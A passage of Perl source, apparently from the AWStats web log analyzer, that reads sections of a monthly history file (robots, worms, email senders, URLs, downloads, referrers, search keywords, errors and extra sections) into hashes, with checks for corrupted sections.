				if ( $SectionsToSave{'device'} ) {
					Save_History( 'device', $year, $month, $date );
					delete $SectionsToSave{'device'};
					if ($withpurge) { %_device_h = (); %_device_p = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}
			# BEGIN_SCREENSIZE
			if ( $field[0] eq 'BEGIN_SCREENSIZE' ) {
				if ($Debug) { debug(" Begin of SCREENSIZE section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'screensize'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_screensize_h{ $field[0] } += $field[1];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_SCREENSIZE' || $field[0] eq "${xmleb}END_SCREENSIZE" || !$_ );
				if (   $field[0] ne 'END_SCREENSIZE'
					&& $field[0] ne "${xmleb}END_SCREENSIZE" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section SCREENSIZE not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of SCREENSIZE section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'screensize'};
				if ( $SectionsToSave{'screensize'} ) {
					Save_History( 'screensize', $year, $month, $date );
					delete $SectionsToSave{'screensize'};
					if ($withpurge) { %_screensize_h = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_ROBOT
			if ( $field[0] eq 'BEGIN_ROBOT' ) {
				if ($Debug) { debug(" Begin of ROBOT section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'robot'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_robot_h{ $field[0] } += $field[1];
							}
							$_robot_k{ $field[0] } += $field[2];
							if ( !$_robot_l{ $field[0] } ) {
								$_robot_l{ $field[0] } = int( $field[3] );
							}
							if ( $field[4] ) {
								$_robot_r{ $field[0] } += $field[4];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_ROBOT' || $field[0] eq "${xmleb}END_ROBOT" || !$_ );
				if (   $field[0] ne 'END_ROBOT'
					&& $field[0] ne "${xmleb}END_ROBOT" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section ROBOT not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of ROBOT section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'robot'};
				if ( $SectionsToSave{'robot'} ) {
					Save_History( 'robot', $year, $month, $date );
					delete $SectionsToSave{'robot'};
					if ($withpurge) {
						%_robot_h = ();
						%_robot_k = ();
						%_robot_l = ();
						%_robot_r = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_WORMS
			if ( $field[0] eq 'BEGIN_WORMS' ) {
				if ($Debug) { debug(" Begin of WORMS section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'worms'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_worm_h{ $field[0] } += $field[1];
							}
							$_worm_k{ $field[0] } += $field[2];
							if ( !$_worm_l{ $field[0] } ) {
								$_worm_l{ $field[0] } = int( $field[3] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_WORMS' || $field[0] eq "${xmleb}END_WORMS" || !$_ );
				if (   $field[0] ne 'END_WORMS'
					&& $field[0] ne "${xmleb}END_WORMS" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section WORMS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of WORMS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'worms'};
				if ( $SectionsToSave{'worms'} ) {
					Save_History( 'worms', $year, $month, $date );
					delete $SectionsToSave{'worms'};
					if ($withpurge) {
						%_worm_h = ();
						%_worm_k = ();
						%_worm_l = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_EMAILS
			if ( $field[0] eq 'BEGIN_EMAILSENDER' ) {
				if ($Debug) { debug(" Begin of EMAILSENDER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'emailsender'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_emails_h{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_emails_k{ $field[0] } += $field[2];
							}
							if ( !$_emails_l{ $field[0] } ) {
								$_emails_l{ $field[0] } = int( $field[3] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_EMAILSENDER' || $field[0] eq "${xmleb}END_EMAILSENDER" || !$_ );
				if (   $field[0] ne 'END_EMAILSENDER'
					&& $field[0] ne "${xmleb}END_EMAILSENDER" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section EMAILSENDER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of EMAILSENDER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'emailsender'};
				if ( $SectionsToSave{'emailsender'} ) {
					Save_History( 'emailsender', $year, $month, $date );
					delete $SectionsToSave{'emailsender'};
					if ($withpurge) {
						%_emails_h = ();
						%_emails_k = ();
						%_emails_l = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_EMAILR
			if ( $field[0] eq 'BEGIN_EMAILRECEIVER' ) {
				if ($Debug) { debug(" Begin of EMAILRECEIVER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'emailreceiver'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_emailr_h{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_emailr_k{ $field[0] } += $field[2];
							}
							if ( !$_emailr_l{ $field[0] } ) {
								$_emailr_l{ $field[0] } = int( $field[3] );
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_EMAILRECEIVER' || $field[0] eq "${xmleb}END_EMAILRECEIVER" || !$_ );
				if (   $field[0] ne 'END_EMAILRECEIVER'
					&& $field[0] ne "${xmleb}END_EMAILRECEIVER" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section EMAILRECEIVER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of EMAILRECEIVER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'emailreceiver'};
				if ( $SectionsToSave{'emailreceiver'} ) {
					Save_History( 'emailreceiver', $year, $month, $date );
					delete $SectionsToSave{'emailreceiver'};
					if ($withpurge) {
						%_emailr_h = ();
						%_emailr_k = ();
						%_emailr_l = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SIDER
			if ( $field[0] eq 'BEGIN_SIDER' ) {
				if ($Debug) { debug(" Begin of SIDER section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'sider'} ) {
							my $loadrecord = 0;
							if ($withupdate) {
								$loadrecord = 1;
							}
							else {
								if ( $HTMLOutput{'main'} ) {
									if ( $MonthRequired eq 'all' ) {
										$loadrecord = 1;
									}
									else {
										if (
											$countloaded < $MaxNbOf{'PageShown'}
											&& $field[1] >= $MinHit{'File'} )
										{
											$loadrecord = 1;
										}
										$TotalDifferentPages++;
									}
								}
								else
								{ # This is for $HTMLOutput = urldetail, urlentry or urlexit
									if ( $MonthRequired eq 'all' ) {
										if (
											(
												!$FilterIn{'url'}
												|| $field[0] =~
												/$FilterIn{'url'}/
											)
											&& ( !$FilterEx{'url'}
												|| $field[0] !~
												/$FilterEx{'url'}/ )
										  )
										{
											$loadrecord = 1;
										}
									}
									else {
										if (
											(
												!$FilterIn{'url'}
												|| $field[0] =~
												/$FilterIn{'url'}/
											)
											&& ( !$FilterEx{'url'}
												|| $field[0] !~
												/$FilterEx{'url'}/ )
											&& $field[1] >= $MinHit{'File'}
										  )
										{
											$loadrecord = 1;
										}
										$TotalDifferentPages++;
									}
								}
								# Posssibilite de mettre if ($FilterIn{'url'} && $field[0] =~ /$FilterIn{'url'}/) mais il faut gerer TotalPages de la meme maniere
								$TotalBytesPages += ( $field[2] || 0 );
								$TotalEntries    += ( $field[3] || 0 );
								$TotalExits      += ( $field[4] || 0 );
							}
							if ($loadrecord) {
								if ( $field[1] ) {
									$_url_p{ $field[0] } += $field[1];
								}
								if ( $field[2] ) {
									$_url_k{ $field[0] } += $field[2];
								}
								if ( $field[3] ) {
									$_url_e{ $field[0] } += $field[3];
								}
								if ( $field[4] ) {
									$_url_x{ $field[0] } += $field[4];
								}
								$countloaded++;
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_SIDER' || $field[0] eq "${xmleb}END_SIDER" || !$_ );
				if (   $field[0] ne 'END_SIDER'
					&& $field[0] ne "${xmleb}END_SIDER" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section SIDER not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of SIDER section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'sider'};

				# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR
				#if ($SectionsToSave{'sider'}) {
				#	Save_History('sider',$year,$month,$date); delete $SectionsToSave{'sider'};
				#	if ($withpurge) { %_url_p=(); %_url_k=(); %_url_e=(); %_url_x=(); }
				#}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_FILETYPES
			if ( $field[0] eq 'BEGIN_FILETYPES' ) {
				if ($Debug) { debug(" Begin of FILETYPES section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'filetypes'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_filetypes_h{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_filetypes_k{ $field[0] } += $field[2];
							}
							if ( $field[3] ) {
								$_filetypes_gz_in{ $field[0] } += $field[3];
							}
							if ( $field[4] ) {
								$_filetypes_gz_out{ $field[0] } += $field[4];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_FILETYPES' || $field[0] eq "${xmleb}END_FILETYPES" || !$_ );
				if (   $field[0] ne 'END_FILETYPES'
					&& $field[0] ne "${xmleb}END_FILETYPES" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section FILETYPES not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of FILETYPES section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'filetypes'};
				if ( $SectionsToSave{'filetypes'} ) {
					Save_History( 'filetypes', $year, $month, $date );
					delete $SectionsToSave{'filetypes'};
					if ($withpurge) {
						%_filetypes_h      = ();
						%_filetypes_k      = ();
						%_filetypes_gz_in  = ();
						%_filetypes_gz_out = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_DOWNLOADS
			if ( $field[0] eq 'BEGIN_DOWNLOADS' ) {
				if ($Debug) {
					debug(" Begin of DOWNLOADS section");
				}
				$field[0] = '';
				my $count       = 0;
				my $counttoload = int($field[1]);
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'downloads'}) {
							$countloaded++;
							$_downloads{$field[0]}->{'AWSTATS_HITS'} += int( $field[1] );
							$_downloads{$field[0]}->{'AWSTATS_206'} += int( $field[2] );
							$_downloads{$field[0]}->{'AWSTATS_SIZE'} += int( $field[3] );	
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_DOWNLOADS' || $field[0] eq "${xmleb}END_DOWNLOADS" || !$_ );
				if (   $field[0] ne 'END_DOWNLOADS'
					&& $field[0] ne "${xmleb}END_DOWNLOADS" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section DOWNLOADS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of DOWNLOADS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'downloads'};
				if ( $SectionsToSave{'downloads'} ) {
					Save_History( 'downloads',
						$year, $month, $date );
					delete $SectionsToSave{'downloads'};
					if ($withpurge) { %_downloads = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SEREFERRALS
			if ( $field[0] eq 'BEGIN_SEREFERRALS' ) {
				if ($Debug) { debug(" Begin of SEREFERRALS section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'sereferrals'} ) {
							$countloaded++;
							if ( $versionnum < 5004 )
							{    # For history files < 5.4
								my $se = $field[0];
								$se =~ s/\./\\./g;
								if ( $SearchEnginesHashID{$se} ) {
									$_se_referrals_h{ $SearchEnginesHashID{$se}
									  } += $field[1] || 0;
								}
								else {
									$_se_referrals_h{ $field[0] } += $field[1] || 0;
								}
							}
							elsif ( $versionnum < 5091 )
							{    # For history files < 5.91
								my $se = $field[0];
								$se =~ s/\./\\./g;
								if ( $SearchEnginesHashID{$se} ) {
									$_se_referrals_p{ $SearchEnginesHashID{$se}
									  } += $field[1] || 0;
									$_se_referrals_h{ $SearchEnginesHashID{$se}
									  } += $field[2] || 0;
								}
								else {
									$_se_referrals_p{ $field[0] } += $field[1] || 0;
									$_se_referrals_h{ $field[0] } += $field[2] || 0;
								}
							}
							else {
								if ( $field[1] ) {
									$_se_referrals_p{ $field[0] } += $field[1];
								}
								if ( $field[2] ) {
									$_se_referrals_h{ $field[0] } += $field[2];
								}
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_SEREFERRALS' || $field[0] eq "${xmleb}END_SEREFERRALS" || !$_ );
				if (   $field[0] ne 'END_SEREFERRALS'
					&& $field[0] ne "${xmleb}END_SEREFERRALS" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section SEREFERRALS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of SEREFERRALS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'sereferrals'};
				if ( $SectionsToSave{'sereferrals'} ) {
					Save_History( 'sereferrals', $year, $month, $date );
					delete $SectionsToSave{'sereferrals'};
					if ($withpurge) {
						%_se_referrals_p = ();
						%_se_referrals_h = ();
					}
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_PAGEREFS
			if ( $field[0] eq 'BEGIN_PAGEREFS' ) {
				if ($Debug) { debug(" Begin of PAGEREFS section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'pagerefs'} ) {
							my $loadrecord = 0;
							if ($withupdate) {
								$loadrecord = 1;
							}
							else {
								if (
									(
										!$FilterIn{'refererpages'}
										|| $field[0] =~
										/$FilterIn{'refererpages'}/
									)
									&& ( !$FilterEx{'refererpages'}
										|| $field[0] !~
										/$FilterEx{'refererpages'}/ )
								  )
								{
									$loadrecord = 1;
								}
							}
							if ($loadrecord) {
								if ( $versionnum < 5004 )
								{    # For history files < 5.4
									if ( $field[1] ) {
										$_pagesrefs_h{ $field[0] } +=
										  int( $field[1] );
									}
								}
								else {
									if ( $field[1] ) {
										$_pagesrefs_p{ $field[0] } +=
										  int( $field[1] );
									}
									if ( $field[2] ) {
										$_pagesrefs_h{ $field[0] } +=
										  int( $field[2] );
									}
								}
								$countloaded++;
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_PAGEREFS' || $field[0] eq "${xmleb}END_PAGEREFS" || !$_ );
				if (   $field[0] ne 'END_PAGEREFS'
					&& $field[0] ne "${xmleb}END_PAGEREFS" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section PAGEREFS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of PAGEREFS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'pagerefs'};
				if ( $SectionsToSave{'pagerefs'} ) {
					Save_History( 'pagerefs', $year, $month, $date );
					delete $SectionsToSave{'pagerefs'};
					if ($withpurge) { %_pagesrefs_p = (); %_pagesrefs_h = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SEARCHWORDS
			if ( $field[0] eq 'BEGIN_SEARCHWORDS' ) {
				if ($Debug) {
					debug( " Begin of SEARCHWORDS section ($MaxNbOf{'KeyphrasesShown'},$MinHit{'Keyphrase'})"
					);
				}
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'searchwords'} ) {
							my $loadrecord = 0;
							if ($withupdate) {
								$loadrecord = 1;
							}
							else {
								if ( $HTMLOutput{'main'} ) {
									if ( $MonthRequired eq 'all' ) {
										$loadrecord = 1;
									}
									else {
										if ( $countloaded <
											   $MaxNbOf{'KeyphrasesShown'}
											&& $field[1] >=
											$MinHit{'Keyphrase'} )
										{
											$loadrecord = 1;
										}
										$TotalDifferentKeyphrases++;
										$TotalKeyphrases += ( $field[1] || 0 );
									}
								}
								elsif ( $HTMLOutput{'keyphrases'} )
								{    # Load keyphrases for keyphrases chart
									if ( $MonthRequired eq 'all' ) {
										$loadrecord = 1;
									}
									else {
										if ( $field[1] >= $MinHit{'Keyphrase'} )
										{
											$loadrecord = 1;
										}
										$TotalDifferentKeyphrases++;
										$TotalKeyphrases += ( $field[1] || 0 );
									}
								}
								if ( $HTMLOutput{'keywords'} )
								{    # Load keyphrases for keywords chart
									$loadrecord = 2;
								}
							}
							if ($loadrecord) {
								if ( $field[1] ) {
									if ( $loadrecord == 2 ) {
										foreach ( split( /\+/, $field[0] ) )
										{    # field[0] is "val1+val2+..."
											$_keywords{$_} += $field[1];
										}
									}
									else {
										$_keyphrases{ $field[0] } += $field[1];
									}
								}
								$countloaded++;
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_SEARCHWORDS' || $field[0] eq "${xmleb}END_SEARCHWORDS" || !$_ );
				if (   $field[0] ne 'END_SEARCHWORDS'
					&& $field[0] ne "${xmleb}END_SEARCHWORDS" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section SEARCHWORDS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of SEARCHWORDS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'searchwords'};
				if ( $SectionsToSave{'searchwords'} ) {
					Save_History( 'searchwords', $year, $month, $date );
					delete $SectionsToSave{ 'searchwords'
					  };    # This save searwords and keywords sections
					if ($withpurge) { %_keyphrases = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_KEYWORDS
			if ( $field[0] eq 'BEGIN_KEYWORDS' ) {
				if ($Debug) {
					debug( " Begin of KEYWORDS section ($MaxNbOf{'KeywordsShown'},$MinHit{'Keyword'})"
					);
				}
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'keywords'} ) {
							my $loadrecord = 0;
							if ( $MonthRequired eq 'all' ) { $loadrecord = 1; }
							else {
								if (   $countloaded < $MaxNbOf{'KeywordsShown'}
									&& $field[1] >= $MinHit{'Keyword'} )
								{
									$loadrecord = 1;
								}
								$TotalDifferentKeywords++;
								$TotalKeywords += ( $field[1] || 0 );
							}
							if ($loadrecord) {
								if ( $field[1] ) {
									$_keywords{ $field[0] } += $field[1];
								}
								$countloaded++;
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_KEYWORDS' || $field[0] eq "${xmleb}END_KEYWORDS" || !$_ );
				if (   $field[0] ne 'END_KEYWORDS'
					&& $field[0] ne "${xmleb}END_KEYWORDS" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section KEYWORDS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of KEYWORDS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'keywords'};
				if ( $SectionsToSave{'keywords'} ) {
					Save_History( 'keywords', $year, $month, $date );
					delete $SectionsToSave{'keywords'};
					if ($withpurge) { %_keywords = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_ERRORS
			if ( $field[0] eq 'BEGIN_ERRORS' ) {
				if ($Debug) { debug(" Begin of ERRORS section"); }
				$field[0] = '';
				my $count       = 0;
				my $countloaded = 0;
				do {
					if ( $field[0] ) {
						$count++;
						if ( $SectionsToLoad{'errors'} ) {
							$countloaded++;
							if ( $field[1] ) {
								$_errors_h{ $field[0] } += $field[1];
							}
							if ( $field[2] ) {
								$_errors_k{ $field[0] } += $field[2];
							}
						}
					}
					$_ = <HISTORY>;
					chomp $_;
					s/\r//;
					@field =
					  split( /\s+/,
						( $readxml ? XMLDecodeFromHisto($_) : $_ ) );
					$countlines++;
				  } until ( $field[0] eq 'END_ERRORS' || $field[0] eq "${xmleb}END_ERRORS" || !$_ );
				if (   $field[0] ne 'END_ERRORS'
					&& $field[0] ne "${xmleb}END_ERRORS" )
				{
					error( "History file \"$filetoread\" is corrupted (End of section ERRORS not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
						"", "", 1
					);
				}
				if ($Debug) {
					debug( " End of ERRORS section ($count entries, $countloaded loaded)"
					);
				}
				delete $SectionsToLoad{'errors'};
				if ( $SectionsToSave{'errors'} ) {
					Save_History( 'errors', $year, $month, $date );
					delete $SectionsToSave{'errors'};
					if ($withpurge) { %_errors_h = (); %_errors_k = (); }
				}
				if ( !scalar %SectionsToLoad ) {
					debug(" Stop reading history file. Got all we need.");
					last;
				}
				next;
			}

			# BEGIN_SIDER_xxx
			foreach my $code ( keys %TrapInfosForHTTPErrorCodes ) {
				if ( $field[0] eq "BEGIN_SIDER_$code" ) {
					if ($Debug) { debug(" Begin of SIDER_$code section"); }
					$field[0] = '';
					my $count       = 0;
					my $countloaded = 0;
					do {
						if ( $field[0] ) {
							$count++;
							if ( $SectionsToLoad{"sider_$code"} ) {
								$countloaded++;
								if ( $field[1] ) {
									$_sider_h{$code}{$field[0]} += $field[1];
								}
								if ( $withupdate || $HTMLOutput{"errors$code"} )
								{
									my $fieldidx = 2;
									foreach (split(//, $ShowHTTPErrorsPageDetail)) {
										last if (! $field[$fieldidx] );
										if ( $_ =~ /R/i ) {
											$_referer_h{$code}{$field[0]} = $field[2];
										} elsif ( $_ =~ /H/i ) {
											$_err_host_h{$code}{$field[0]} = $field[$fieldidx];
										}
										$fieldidx++;
									}
								}
							}
						}
						$_ = <HISTORY>;
						chomp $_;
						s/\r//;
						@field = split(
							/\s+/,
							(
								$readxml
								? XMLDecodeFromHisto($_)
								: $_
							)
						);
						$countlines++;
					  } until ( $field[0] eq "END_SIDER_$code" || $field[0] eq "${xmleb}END_SIDER_$code" || !$_ );
					if (   $field[0] ne "END_SIDER_$code"
						&& $field[0] ne "${xmleb}END_SIDER_$code" )
					{
						error( "History file \"$filetoread\" is corrupted (End of section SIDER_$code not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
							"", "", 1
						);
					}
					if ($Debug) {
						debug( " End of SIDER_$code section ($count entries, $countloaded loaded)" );
					}
					delete $SectionsToLoad{"sider_$code"};
					if ( $SectionsToSave{"sider_$code"} ) {
						Save_History( "sider_$code", $year, $month, $date );
						delete $SectionsToSave{"sider_$code"};
						if ($withpurge) {
							%{$_sider_h{$code}} = ();
							%{$_referer_h{$code}} = ();
							%{$_err_host_h{$code}} = ();
						}
					}
					if ( !scalar %SectionsToLoad ) {
						debug(" Stop reading history file. Got all we need.");
						last;
					}
					next;
				}
			}

			# BEGIN_EXTRA_xxx
			foreach my $extranum ( 1 .. @ExtraName - 1 ) {
				if ( $field[0] eq "BEGIN_EXTRA_$extranum" ) {
					if ($Debug) { debug(" Begin of EXTRA_$extranum"); }
					$field[0] = '';
					my $count       = 0;
					my $countloaded = 0;
					do {
						if ( $field[0] ne '' ) {
							$count++;
							if ( $SectionsToLoad{"extra_$extranum"} ) {
								if (   $ExtraStatTypes[$extranum] =~ /P/i
									&& $field[1] )
								{
									${ '_section_' . $extranum . '_p' }
									  { $field[0] } += $field[1];
								}
								${ '_section_' . $extranum . '_h' }
								  { $field[0] } += $field[2];
								if (   $ExtraStatTypes[$extranum] =~ /B/i
									&& $field[3] )
								{
									${ '_section_' . $extranum . '_k' }
									  { $field[0] } += $field[3];
								}
								if ( $ExtraStatTypes[$extranum] =~ /L/i
									&& !${ '_section_' . $extranum . '_l' }
									{ $field[0] }
									&& $field[4] )
								{
									${ '_section_' . $extranum . '_l' }
									  { $field[0] } = int( $field[4] );
								}
								$countloaded++;
							}
						}
						$_ = <HISTORY>;
						chomp $_;
						s/\r//;
						@field = split(
							/\s+/,
							(
								$readxml
								? XMLDecodeFromHisto($_)
								: $_
							)
						);
						$countlines++;
					  } until ( $field[0] eq "END_EXTRA_$extranum" || $field[0] eq "${xmleb}END_EXTRA_$extranum" || !$_ );
					if (   $field[0] ne "END_EXTRA_$extranum"
						&& $field[0] ne "${xmleb}END_EXTRA_$extranum" )
					{
						error( "History file \"$filetoread\" is corrupted (End of section EXTRA_$extranum not found).\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).",
							"", "", 1
						);
					}
					if ($Debug) {
						debug( " End of EXTRA_$extranum section ($count entries, $countloaded loaded)" );
					}
					delete $SectionsToLoad{"extra_$extranum"};
					if ( $SectionsToSave{"extra_$extranum"} ) {
